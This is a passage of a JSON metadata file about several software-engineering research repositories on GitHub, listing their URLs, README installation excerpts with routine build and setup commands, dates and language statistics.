        "filename": "EngineeringSoftware_CoditT5_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/EngineeringSoftware/CoditT5",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Requires the pretrain dataset at `data/CoditT5/pretrain/`\n```\ncd python/\n./run.sh pretrain_CoditT5\n```\n \n",
                    "original_header": "Pretrain CoditT5"
                },
                "confidence": 0.995645850558155,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/CoditT5/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We provide the sample script to process the downstream datasets for CoditT5. Requires the raw data files at `raw_data/`.\n```\ncd python/\n./run.sh process_coditT5_dataset --dataset ${dataset}\n\n# Example: ./run.sh process_coditT5_dataset --dataset comment-update\n```\n \n",
                    "original_header": "Code for Processing Fine-tuning Data"
                },
                "confidence": 0.9999946804638516,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/CoditT5/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\ncd python/\n# Rerank CodeT5's outputs with CoditT5\n./run.sh CodeT5_rerank ${dataset}\n# Rerank CoditT5's outputs with CodeT5\n./run.sh CodeT5_rerank ${dataset}\n\n# Example: ./run.sh CoditT5_rerank comment-update\n``` \n",
                    "original_header": "Rerank Models' outputs"
                },
                "confidence": 0.9999892885860772,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/CoditT5/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-08-22T17:02:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-23T15:14:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 370046
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 10216
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "387": {
        "filename": "H2SO4T_ARES_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/H2SO4T/ARES",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "* Install Appium from http://appium.io/docs/en/about-appium/getting-started/; please make sure to set up the \n  environment variables. $ANDROID_HOME and $JAVA_HOME\n* Use appium-doctor to check that everything is working correctly\n* Create a virtualenv named `venv` in folder ARES (not in rl_interaction):\n`virtualenv -p python3 venv` and source it `source venv/bin/activate`\n* Go to rl_interaction: `cd rl_interaction`\n* Install the requirements `requirements.txt` using the command `pip3 install -r requirements.txt`\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation and Setup"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/H2SO4T/ARES/pytorch-ares/Readme.md"
            },
            {
                "result": {
                    "value": "* Export PYTHONPATH: ``export PYTHONPATH=\"path/to/ares\"``\n* Move yourself to `ares/rl_interaction`\n* Generate a folder for the apks, and put them inside\n* Activate the venv \n* Start testing\n",
                    "type": "Text_excerpt",
                    "original_header": "Using the testing Tool (Quick Guide)"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/H2SO4T/ARES/pytorch-ares/Readme.md"
            },
            {
                "result": {
                    "value": "* Create one or more Android emulators.\n* Run the tests using `parallel_exec.py`:\n`python3 parallel_exec.py --instr_jacoco --list_devices \"avd-name0 avd-name1 ...\" --appium_ports \"4270 4277 ...\" \n  --android_ports \"5554 5556 ...\" --path \"apps\" --timer 60 --rotation --internet --emu headless --platform_version 8.1 \n  --iterations 10 --algo SAC --timesteps 4000 --trials_per_app 3`\n  \nThe flag `--instr_jacoco`  is not useful if you are not interested in code coverage.\nYou don't need to boot the emulators; ARES will do it for you.\nTo see the avd names of your emulators, you can run `emulator -list-avds`.\nThere is no need to specify `udids` using emulated devices since ARES will manage them automatically.\nRead `Available Flags` for more information.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Testing with emulated devices",
                    "parent_header": [
                        "Using the testing Tool (Quick Guide)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/H2SO4T/ARES/pytorch-ares/Readme.md"
            },
            {
                "result": {
                    "value": "* Buy one or more Android devices.\n* Activate ADB and usb debug.\n* Run the testing using `parallel_exec.py`:\n`python3 parallel_exec.py --instr_jacoco --real_device --udids \"HG*****9 PO********NA\" --list_device \"lenovo1 levecchio2\" \n  --appium_ports \"4270 4290\" --android_ports \"5554 5556\" --path \"apps\" --timer 70 --rotation --internet  \n  --platform_version 7.0 --iterations 2 --algo SAC --timesteps 5000 --trials_per_app 3`\n\nWith real devices the flag `--list_devices` can contain arbitrary names, while the flag `--udids` must contain \nthe real udids of your devices.\nYou can find the udids using the command `adb devices`\nFlag `--real_device` is required.\n  ",
                    "type": "Text_excerpt",
                    "original_header": "Testing with real devices",
                    "parent_header": [
                        "Using the testing Tool (Quick Guide)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/H2SO4T/ARES/pytorch-ares/Readme.md"
            },
            {
                "result": {
                    "value": "* At first install `miniconda` from https://github.com/conda-forge/miniforge.\n* Create a venv using `conda create --name venv` and activate it `conda activate venv`.\n* Run `conda install pandas`, `conda install numpy` and `conda install scipy`, and `conda install pyyaml`, `conda install typing_extensions`.\n",
                    "type": "Text_excerpt",
                    "original_header": "Install Miniconda and Setup",
                    "parent_header": [
                        "Working with Apple Silicon (M1 SoCs)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/H2SO4T/ARES/pytorch-ares/Readme.md"
            },
            {
                "result": {
                    "value": "* Run `brew install openblas`\n* Then clone pytorch: `git clone --recursive https://github.com/pytorch/pytorch`\n* `cd pytorch`\n* run `python setup.py build`\n* run `python setup.py develop`\n* Install the missing packages using pip: `stable_baselines3`, `loguru==0.5.0`, `androguard==3.3.5`, `Appium-Python-Client==1.0.2`, `cloudpickle==1.2.2`, `future==0.18.2` and `gym==0.18.0`\n* At last, modify il `parallel_exec.py` at line 99: insert a string with the path to the venv python (use `which python` when the venv is activated)\n\nNow the environt is ready!\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing Pytorch on Apple Silicon",
                    "parent_header": [
                        "Working with Apple Silicon (M1 SoCs)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/H2SO4T/ARES/pytorch-ares/Readme.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "ARES does not instrument any application, however supports emma code coverage (for legacy apps) and JaCoCo (to instruement Android apps from source code go to https://github.com/H2SO4T/COSMO)\n \n",
                    "original_header": "ARES"
                },
                "confidence": 0.9987059497870522,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/H2SO4T/ARES/pytorch-ares/Readme.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* `--instr_emma`,  If you want to collect code coverage with EMMA.\n* `--instr_jacoco`,  If you want to collect code coverage using JaCoCo.\n  `--save_policy`, You can save an exploration policy of your app and use it in new explorations.\n  `--reload_policy`, Tell ARES to reload a previous policy.\n* `--real_device`, If you are using a real device you must specify it.\n* `--timer: [time_in_minutes]`, You can specify the time to test the app, required=True.\n* `--platform_version [android_version]`, You have to specify the android version, default = 10.0 . \n* `--iterations [number_of_iterations]`, How many times you want to repeat the test, default=10 .\n* `--algo [algo]`, Choose one between SAC random and Q-Learning (SAC is the algorithm used in the paper).\n* `--timesteps`, Number of time steps of each testing, (`--timer` has higher priority ), required=True.\n* `--rotation`, If you want to enable rotation.\n* `--internet`, If you want to toggle data during testing.\n* `--emu`, If you are using an emulator, you need to specify in what mode (normal or headless).\n* `--max_timesteps`, You can specify the duration of an episode, default = 250 .\n* `--pool_strings`, Name of the file to pick the strings from, default = strings.txt .\n* `--list_devices [emulators]`, A list of the device_names (avd_names), required = True.\n* `--appium_ports [ports]`, A list of the ports you want to use, required = True.\n* `--android_ports [ports]`, A list  of the adb-ports you want to use, required = True.\n* `--udids [strings]`, A list of the udids of the real devices, in case you are using \nemulators don't use this flag (ARES will assign udids for you).\n* `--trials_per_app`, How many times ARES attempts to launch an app.\n* `--path [folders]`,The folder containing all apks, ARES will equally subdivide the apps between the devices available.  \n \n",
                    "original_header": "Available Flags:"
                },
                "confidence": 0.9999999999990905,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/H2SO4T/ARES/pytorch-ares/Readme.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Using ARES on Apple Silicon is possible, but the configuration is a bit longer. The configuration steps are identical, except for the Python part. \nWe tested this procedure on a Mac Mini 16Gb, Python3.9 and a real device.\n \n",
                    "original_header": "Working with Apple Silicon (M1 SoCs)"
                },
                "confidence": 0.9821700684408183,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/H2SO4T/ARES/pytorch-ares/Readme.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-11-12T11:00:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-04T09:14:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 71621
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "388": {
        "filename": "d-and-c_d-and-c_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/TruX-DTF/d-and-c",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "\tIn order to run the code, python3 is necessary with the additional libraries such as LightGBM.\n\nExtract the archives allResults.db.7z and simiSmall.h5 2.7z.00X which are containing the prediction probabilities of all the classifies and similarity score of the bug report / source code files pairs used in the study.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup:"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/d-and-c/d-and-c/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-06-28T11:33:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-26T13:17:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 29436
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "389": {
        "filename": "sulir_iostudy_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sulir/iostudy",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-03-14T03:03:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-03-14T03:04:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 42177
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 7613
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1097
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "390": {
        "filename": "yichao-yuan-99_Everest_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/yichao-yuan-99/Everest",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Please follow the README in `inputs` directory \n",
                    "type": "Text_excerpt",
                    "original_header": "Prepare Inputs"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/yichao-yuan-99/Everest/main/README.md"
            },
            {
                "result": {
                    "value": "In `CMakeLists.txt:29`, change `set(CMAKE_CUDA_FLAGS_RELEASE \"-O3 -lineinfo -arch=sm_86\")` to\n`set(CMAKE_CUDA_FLAGS_RELEASE \"-O3 -lineinfo -arch=sm_86 -ccbin <your c++17 compiler>\")`\n\nIn `system/tmin/utils.py:24`, change `command = f'nvcc -O3 --std=c++17 -arch=sm_86 -I../include -Xcompiler -fPIC -shared -o {out} {file}'` to ` ommand = f'nvcc -O3 --std=c++17 -arch=sm_86  -ccbin <your c++17 compiler> -I../include -Xcompiler -fPIC -shared -o {out} {file}'`\n",
                    "type": "Text_excerpt",
                    "original_header": "Fix",
                    "parent_header": [
                        "Troubleshooting",
                        "During Compilation of `.cu` file, it shows `fatal error: filesystem: No such file or directory`"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/yichao-yuan-99/Everest/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Then use the following commands to build the system\n```\nmkdir build && cd build\ncmake ..\nmake -j\n``` \nLook up the number here: https://developer.nvidia.com/cuda-gpus#compute\n \n",
                    "original_header": "Build"
                },
                "confidence": 0.9831837080684243,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/yichao-yuan-99/Everest/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The structure of the repository is shown below:\n```\n\u251c\u2500\u2500 CMakeLists.txt\n\u251c\u2500\u2500 include         # header files\n\u251c\u2500\u2500 inputs          # where the systems looks for inputs\n\u2502   \u251c\u2500\u2500 graphs\n\u2502   \u251c\u2500\u2500 motifs\n\u2502   \u2514\u2500\u2500 README.md\n\u251c\u2500\u2500 plugins         # legacy code, including the baseline GPU implementation\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 src             # C++/CUDA source code\n\u2502   \u251c\u2500\u2500 CMakeLists.txt\n\u2502   \u251c\u2500\u2500 core        # core library\n\u2502   \u251c\u2500\u2500 mods        # pybind files\n\u2502   \u2514\u2500\u2500 tools       # some helper tools\n\u2514\u2500\u2500 system          # the overall system. cd to this directory to run everything\n    \u251c\u2500\u2500 batch-query.py\n    \u251c\u2500\u2500 filter.py\n    \u251c\u2500\u2500 generateQueries.py\n    \u251c\u2500\u2500 legacy.py\n    \u251c\u2500\u2500 process-batch-query.sh\n    \u251c\u2500\u2500 process-single-query.sh\n    \u251c\u2500\u2500 run-legacy.sh          # all the python files and bash scripts above\n    \u251c\u2500\u2500 single-query.py        # provide simple user interfaces\n    \u251c\u2500\u2500 queries                # lots of example queries\n    \u251c\u2500\u2500 scripts                # some helper scripts \n    \u251c\u2500\u2500 templates              # the template files used by the code generator\n    \u251c\u2500\u2500 tmine                  # the Python source code \n    \u2514\u2500\u2500 tools                  # some helper tools\n```\n \n",
                    "original_header": "Repository Structure"
                },
                "confidence": 0.9999999996932729,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/yichao-yuan-99/Everest/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-09-18T15:35:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-04T03:18:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Cuda",
                    "name": "Cuda",
                    "type": "Programming_language",
                    "size": 120431
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 70420
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 39394
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 3535
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1238
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 104
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "391": {
        "filename": "dyninst_fuzz_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/dyninst/fuzz",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "In this study, we updated the source code used in the [original fuzzing study](https://dl.acm.org/doi/abs/10.1145/96267.96279). Now it applies to Linux, OS X and FreeBSD.\n \n",
                    "original_header": "Code"
                },
                "confidence": 0.9263297027606978,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dyninst/fuzz/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\u200b&emsp;To build fuzz.c and ptyjig.c, run: \n\u200b&emsp;```cd ./src && make all``` \n",
                    "original_header": "./src"
                },
                "confidence": 0.9575733952709393,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dyninst/fuzz/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\u200b&emsp;Name and option pools of each cmd to be tested on Linux. \n\u200b&emsp;Name and option pools of each cmd to be tested on MacOS. \n\u200b&emsp;Name and option pools of each cmd to be tested on FreeBSD. \n\u200b&emsp;Automatic script to test all utilities listed in a configuration file(see ./test_Linux/ or ./test_MacOS/ or ./test_FreeBSD/).  \n",
                    "original_header": "./run_test"
                },
                "confidence": 0.9454721814628206,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dyninst/fuzz/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-08-13T16:33:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-10T15:37:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 38941
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 28860
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 121
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "392": {
        "filename": "shrivastava-piyush_nlp-code-summarization_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/shrivastava-piyush/nlp-code-summarization",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-11-16T12:59:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-12-16T18:16:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 568604
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 54137
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "393": {
        "filename": "SmallkeyChen_RobOT_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Testing4AI/RobOT",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "gen_adv.py is to generate adversarial inputs for test selection and robustness evaluation. You could also use toolbox like <a href=\"https://github.com/cleverhans-lab/cleverhans\" target=\"_blank\">cleverhans</a> for the test case generation.  \n\nFor testing methods (DeepXplore, DLFuzz, ADAPT), we use the code repository <a href=\"https://github.com/kupl/ADAPT\" target=\"_blank\">ADAPT</a>.  \nFor testing methods (AEQUITAS, ADF), we use the code repository <a href=\"https://github.com/pxzhang94/ADF\" target=\"_blank\">ADF</a>. \n \n",
                    "original_header": "Functions"
                },
                "confidence": 0.9658851726632259,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SmallkeyChen/RobOT/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-02-03T13:36:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-07-08T08:51:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 59262
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "394": {
        "filename": "arminmoin_ML-Quadrat_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/arminmoin/ML-Quadrat",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "**System requirements and software prerequisites:**\r\nWe recommend a normal PC/laptop with at least 4GB of main memory (RAM) and at least 1GB of free disk space. In this tutorial, we use a x86_64 Linux system with the Ubuntu 20.04.2 LTS (focal) operating system. Please install the following software before proceeding with the installation of ML2 (use ```sudo su``` to run the commands as root and at the end ```exit``` in order to get back to the non-root user):\r\n\r\n1. [Git](https://git-scm.com/): \r\n```\r\nsudo su\r\napt-get install git\r\n```\r\n2. [The Java Runtime Environment (JRE) and the Java Development Kit (JDK)](https://www.java.com/en/download/): \r\n```\r\napt-get install default-jre default-jdk\r\n```\r\n3. [Apache Maven](https://maven.apache.org/): \r\n```\r\napt-get install maven\r\nexit\r\n```\r\n\r\n**Now, please follow the steps below in the Linux terminal / shell / command line:**\r\n\r\n1. Check out the source code from the Git repository:\r\n```bash\r\ngit clone https://github.com/arminmoin/ML-Quadrat/\r\n```\r\n\r\n2. Install ML2 using the Apache Maven:\r\n```bash\r\ncd ML-Quadrat\r\nmvn clean install -DskipTests\r\ncd ML2/language\r\nmvn clean install -DskipTests\r\ncd ../..\r\n```\r\n\r\nNote that the -DskipTests option lets us skip running the tests, thus saving more time.\r\n\r\nIf you want to see a more detailed output to debug, use the option -X:\r\n\r\n```bash\r\nmvn clean install -DskipTests -X\r\n```\r\n\r\nMoreover, if you want to use Maven in the offline mode, e.g., in the case that your machine is behind a firewall that prohibits the Internet access, you should use the option -o, but, remember that you would need to first copy the .m2 directory, which includes the Maven cache from another computer behind the firewall (on which you have already cached \u00b4the required dependencies) to this computer. The .m2 directory is usually stored in the user's home directory.\r\n\r\n```bash\r\nmvn clean install -DskipTests -o\r\n```\r\n\r",
                    "type": "Text_excerpt",
                    "original_header": "How to install ML2?",
                    "parent_header": [
                        "Table of Contents",
                        "3. Quick (15 mins) Tutorial"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/arminmoin/ML-Quadrat/master/README.md"
            },
            {
                "result": {
                    "value": "The code that we generated for the sample model instance through the [quick (15 mins) tutorial](#user-doc-quick) above, namely [ML2_Demo_PingPong.thingml](https://github.com/arminmoin/ML-Quadrat/blob/master/ML2/org.thingml.samples/src/main/thingml/ML2_Demo_PingPong.thingml), can be built easily using the Apache Maven (the generated code resides in the /home/user/Generated_ML2_Demo_PingPong directory):\r\n\r\n```bash\r\ncd /home/user/Generated_ML2_Demo_PingPong\r\ncd python_java/\r\nmvn clean install\r\n```\r\nAs mentioned, if you want to see a more detailed output to debug, use the option -X:\r\n\r\n```bash\r\nmvn clean install -X\r\n```\r\n\r\nMoreover, as stated before, if you want to use Maven in the offline mode, e.g., in the case that your machine is behind a firewall that prohibits the Internet access, you should use the option -o, but, remember that you would need to first copy the .m2 directory, which includes the Maven cache from another computer behind the firewall (on which you have already cached \u00b4the required dependencies) to this computer. The .m2 directory is usually stored in the user's home directory.\r\n\r\n```bash\r\nmvn clean install -o\r\n```\r\n\r\nThe target directory is created/updated. If the software model instance has a data analytics section with a dataset path, then we must provide the dataset in the target directory at the same path as specified in the data analytics section of the model instance, before running the application / IoT service. For now, we copy a dummy sample dataset that is available at: https://github.com/arminmoin/ML-Quadrat/tree/master/ML2/org.thingml.samples/src/main/thingml/ML2_Demos_SampleData\r\n\r\nFor the current example, we should choose the sample dataset [ip_dataset.csv](https://github.com/arminmoin/ML-Quadrat/blob/master/ML2/org.thingml.samples/src/main/thingml/ML2_Demos_SampleData/ip_dataset.csv). We should copy this Comma-Sparated Values (CSV) file into the correct path, in this case at target/data (the data sub-directory must be created):\r\n\r\n```bash\r\ncd target/\r\nmkdir data\r\ncp /home/user/ML-Quadrat/ML2/org.thingml.samples/src/main/thingml/ML2_Demos_SampleData/ip_dataset.csv data/\r\n```\r\nNow, in order to run the generated application / IoT service:\r\n\r\n```bash\r\njava -jar SmartPingPongCfg-1.0.0-jar-with-dependencies.jar\r\n```\r\nAfter running the service, you will see the output in the terminal. You may stop the service by pressing CTRL+C. If you check out the provided CSV file in the data directory, you'll see a new line appended there, as the result of the prediction of the deployed ML model in this sample smart IoT service. \r\n\r\nCongratulations! It worked!\r\n\r\n**Note:** If you try to generate the code on one machine and run the generated code on another machine, you might experience troubles, due to the absolute paths, e.g., in the case of the python_java code generator, in the generated Python scripts under src/python-scripts. Please adjust them accordingly before running the code. Alternatively, you can generate the code on the new machine and then execute the generated code.\r\n\r",
                    "type": "Text_excerpt",
                    "original_header": "How to install and execute the generated code?",
                    "parent_header": [
                        "Table of Contents",
                        "4. Users' Documentation (Full Tutorial)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/arminmoin/ML-Quadrat/master/README.md"
            },
            {
                "result": {
                    "value": "Once installed, you shall create a new workspace and then import the ML2 project there. Perhaps there are different ways to accomplish that. However, we recommend the following method:\r\n\r\nFile -> import -> General -> Existing Projects into Workspace / Projects from Folder or Archive (you should also check the option **search for nested projects** in the wizard)\r\n\r\nMake sure that you wait sufficiently long, so that the (sub-/nested) projects are built and you get a clean workspace without any errors. If that is not the case, sometimes cleaning the workspace (Project -> Clean... -> Clean all projects), updating the Maven projects (right click on a project -> Maven -> Update Project... -> Select All, you may also check the option **Force Update of Snapshots/Releases**) or restarting the Eclipse IDE (Eclipse Modeling Tools) might help.\r\n\r\nOnce you import the projects into the workspace in the Eclipse IDE, you will get notified about a number of missing extensions, such as the Maven support in Eclipse (m2e) and the Eclipse Enterprise Java and Web Developers Tools, which can be installed through the Eclipse Marketplace. Please install them one by one. You will need to restart the Eclipse IDE after each installation. \r\n\r\nFinall, please go to Help -> Install New Software and install the following software through the default update site (e.g., http://download.eclipse.org/releases/2021-03): Under the Modeling category, select and install the MWE2 Language SDK, MWE2 Runtime SDK and Xtext Complete SDK.\r\n\r\n\r",
                    "type": "Text_excerpt",
                    "original_header": "How to set up the workspace in the Eclipse IDE (Eclipse Modeling Tools)?",
                    "parent_header": [
                        "Table of Contents",
                        "4. Users' Documentation (Full Tutorial)",
                        "How to create new software model instances?"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/arminmoin/ML-Quadrat/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "ML2 is a research prototype. If you find any issues/bugs or have any feature request, please kindly report that through our issue tracking system: https://github.com/arminmoin/ML-Quadrat/issues\r\n\r\n[Back to top](#toc)\r\n\r\n<a name=\"user-doc-quick\"></a>\r \n",
                    "original_header": "2. Reporting Issues/Bugs and Requests"
                },
                "confidence": 0.9998314929202036,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/arminmoin/ML-Quadrat/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You can find the Maven artifacts of ML2 at https://oss.sonatype.org (e.g., search for the groupid: io.github.arminmoin). You may add the dependencies to your pom.xml file. For instance, add the following to your pom.xml:\r\n\r\n```\r\n<dependency>\r\n  <groupId>io.github.arminmoin</groupId>\r\n  <artifactId>mlquadrat</artifactId>\r\n  <version>2.0.0-SNAPSHOT</version>\r\n  <type>pom</type>\r\n</dependency>\r\n```\r\n\r\n[Back to top](#toc)\r\n\r\n<a name=\"dev-doc\"></a>\r \n",
